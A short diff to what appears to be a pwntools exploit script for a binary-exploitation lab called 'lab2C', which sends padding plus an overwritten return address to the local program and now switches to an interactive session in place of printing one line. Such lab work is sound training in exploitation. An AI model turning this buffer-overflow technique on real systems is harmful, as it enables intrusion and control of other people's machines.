@@ -6,7 +6,7 @@ def main():
     eip = p32(0xdeadbeef)
     payload = junk + eip
     p = process(['./lab2C', payload])
-    print p.recvline()
+    p.interactive()
 
 if __name__ == "__main__":
     main()
